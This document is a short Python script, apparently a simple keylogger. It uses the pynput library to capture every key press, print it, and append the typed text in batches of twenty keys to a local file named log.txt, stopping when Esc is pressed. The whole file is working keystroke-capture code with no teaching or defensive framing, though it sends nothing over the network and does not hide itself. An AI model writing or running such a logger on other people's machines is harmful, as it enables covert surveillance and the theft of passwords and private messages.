import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []

def key_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 20:
        count = 0
        write_file(keys)
        keys = []

def key_release(key):
    if key == Key.esc:
        return False

def write_file(keys):
    with open("log.txt", "a") as log:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                log.write('\n')
            elif k.find("Key") == -1:
                log.write(k)

with Listener(on_press = key_press, on_release = key_release) as listener:
    listener.join()
